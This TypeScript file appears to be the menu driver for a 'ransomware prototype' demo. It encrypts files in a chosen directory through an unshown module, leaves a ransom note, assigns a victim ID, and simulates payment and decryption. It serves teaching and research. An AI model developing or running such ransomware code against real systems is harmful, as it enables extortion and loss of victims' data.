import path from 'path'
import { createInterface } from 'readline'
import {
    encryptTargetFiles,
    decryptFiles,
    simulatePayment,
    verifyPayment,
    createPaymentReceipt
} from './ransomware'

// Create readline interface for user input
const rl = createInterface({
    input: process.stdin,
    output: process.stdout
})

// Store the encryption results for later decryption
let encryptionResults: {
    victimId: string
    encryptedAESKey: Buffer
    attackerPrivateKey: string
    encryptedFiles: string[]
    encryptionStats: {
        totalFiles: number
        totalSize: number
        encryptionTime: number
        targetExtensions: string[]
        timestamp: Date
    }
} | null = null

// Main function to run the demo
async function runRansomwareDemo() {
    console.log('============================================================')
    console.log('              RANSOMWARE PROTOTYPE DEMONSTRATION            ')
    console.log('          FOR EDUCATIONAL AND RESEARCH PURPOSES ONLY        ')
    console.log('============================================================')
    console.log(
        '\nWARNING: This prototype is designed to simulate ransomware behavior'
    )
    console.log(
        'in a controlled environment. It should NEVER be used for malicious purposes.\n'
    )

    console.log('Select an operation:')
    console.log('1. Encrypt files (TEST MODE - Safe for demonstration)')
    console.log('2. Decrypt files (requires previous encryption)')
    console.log('3. Simulate full attack lifecycle')
    console.log('4. Exit\n')

    rl.question('Enter your choice (1-4): ', async (choice) => {
        switch (choice) {
            case '1':
                await runEncryption()
                break
            case '2':
                await runDecryption()
                break
            case '3':
                await runFullLifecycle()
                break
            case '4':
                console.log('\nExiting program. Goodbye!')
                rl.close()
                break
            default:
                console.log('\nInvalid choice. Please try again.')
                runRansomwareDemo()
                break
        }
    })
}

// Function to run the encryption process
async function runEncryption() {
    console.log('\n=== ENCRYPTION PROCESS ===\n')

    rl.question('Enter the target directory path: ', async (targetDir) => {
        try {
            console.log(`\nTarget directory: ${targetDir}`)
            console.log(
                'Encrypting files in TEST MODE (no files will be deleted)...\n'
            )

            // Run the encryption process
            encryptionResults = await encryptTargetFiles(targetDir, true)

            console.log(`\nEncryption complete!`)
            console.log(`Victim ID: ${encryptionResults.victimId}`)
            console.log(
                `Files encrypted: ${encryptionResults.encryptedFiles.length}`
            )
            console.log(
                `Total data encrypted: ${
                    encryptionResults.encryptionStats.totalSize / (1024 * 1024)
                } MB`
            )
            console.log(
                `Time taken: ${encryptionResults.encryptionStats.encryptionTime.toFixed(
                    2
                )} seconds`
            )
            console.log(
                '\nA ransom note has been created in the target directory.'
            )
            console.log(
                'To decrypt the files, use option 2 from the main menu.\n'
            )

            // Return to main menu
            rl.question('Press Enter to return to the main menu...', () => {
                runRansomwareDemo()
            })
        } catch (err) {
            console.error(`\nError during encryption: ${err}`)
            rl.question('Press Enter to return to the main menu...', () => {
                runRansomwareDemo()
            })
        }
    })
}

// Function to run the decryption process
async function runDecryption() {
    console.log('\n=== DECRYPTION PROCESS ===\n')

    if (!encryptionResults) {
        console.log(
            'No encryption has been performed yet. Please encrypt files first.'
        )
        rl.question('Press Enter to return to the main menu...', () => {
            runRansomwareDemo()
        })
        return
    }

    rl.question('Enter the target directory path: ', async (targetDir) => {
        try {
            console.log(`\nTarget directory: ${targetDir}`)
            console.log('Decrypting files...\n')

            // Simulate payment
            const { transactionId } = simulatePayment(
                encryptionResults.victimId
            )
            console.log(`Payment simulation: Transaction ID ${transactionId}`)

            // Verify payment
            const verified = verifyPayment(transactionId)
            console.log(
                `Payment verification: ${verified ? 'Successful' : 'Failed'}`
            )

            if (verified) {
                // Create payment receipt
                createPaymentReceipt(
                    encryptionResults.victimId,
                    transactionId,
                    targetDir
                )
                console.log('Payment receipt created in the target directory.')

                // Decrypt files
                const decryptedFiles = await decryptFiles(
                    targetDir,
                    encryptionResults.encryptedAESKey,
                    encryptionResults.attackerPrivateKey
                )

                console.log(`\nDecryption complete!`)
                console.log(`Files decrypted: ${decryptedFiles.length}`)
                console.log(
                    '\nAll files have been restored to their original state.'
                )
                console.log(
                    'The ransom note and metadata files have been removed.\n'
                )
            } else {
                console.log(
                    '\nPayment verification failed. Files will not be decrypted.\n'
                )
            }

            // Return to main menu
            rl.question('Press Enter to return to the main menu...', () => {
                runRansomwareDemo()
            })
        } catch (err) {
            console.error(`\nError during decryption: ${err}`)
            rl.question('Press Enter to return to the main menu...', () => {
                runRansomwareDemo()
            })
        }
    })
}

// Function to run the full lifecycle
async function runFullLifecycle() {
    console.log('\n=== FULL RANSOMWARE LIFECYCLE SIMULATION ===\n')

    rl.question('Enter the target directory path: ', async (targetDir) => {
        try {
            console.log(`\nTarget directory: ${targetDir}`)
            console.log('Starting full lifecycle simulation...\n')

            // Step 1: Encryption
            console.log('STEP 1: Encryption Process\n')
            encryptionResults = await encryptTargetFiles(targetDir, true)

            console.log(`\nEncryption complete!`)
            console.log(`Victim ID: ${encryptionResults.victimId}`)
            console.log(
                `Files encrypted: ${encryptionResults.encryptedFiles.length}`
            )
            console.log(
                `Total data encrypted: ${
                    encryptionResults.encryptionStats.totalSize / (1024 * 1024)
                } MB`
            )
            console.log(
                `Time taken: ${encryptionResults.encryptionStats.encryptionTime.toFixed(
                    2
                )} seconds`
            )
            console.log(
                '\nA ransom note has been created in the target directory.'
            )

            // Step 2: Payment Simulation
            console.log('\nSTEP 2: Payment Simulation\n')
            const { transactionId } = simulatePayment(
                encryptionResults.victimId
            )
            console.log(`Payment simulation: Transaction ID ${transactionId}`)

            // Step 3: Payment Verification
            console.log('\nSTEP 3: Payment Verification\n')
            const verified = verifyPayment(transactionId)
            console.log(
                `Payment verification: ${verified ? 'Successful' : 'Failed'}`
            )

            // Step 4: Decryption
            console.log('\nSTEP 4: Decryption Process\n')

            if (verified) {
                // Create payment receipt
                createPaymentReceipt(
                    encryptionResults.victimId,
                    transactionId,
                    targetDir
                )
                console.log('Payment receipt created in the target directory.')

                // Decrypt files
                const decryptedFiles = await decryptFiles(
                    targetDir,
                    encryptionResults.encryptedAESKey,
                    encryptionResults.attackerPrivateKey
                )

                console.log(`\nDecryption complete!`)
                console.log(`Files decrypted: ${decryptedFiles.length}`)
                console.log(
                    '\nAll files have been restored to their original state.'
                )
                console.log(
                    'The ransom note and metadata files have been removed.\n'
                )
            } else {
                console.log(
                    '\nPayment verification failed. Files will not be decrypted.\n'
                )
            }

            console.log('\nFull lifecycle simulation complete!\n')

            // Return to main menu
            rl.question('Press Enter to return to the main menu...', () => {
                runRansomwareDemo()
            })
        } catch (err) {
            console.error(`\nError during lifecycle simulation: ${err}`)
            rl.question('Press Enter to return to the main menu...', () => {
                runRansomwareDemo()
            })
        }
    })
}

// Start the demo
runRansomwareDemo()
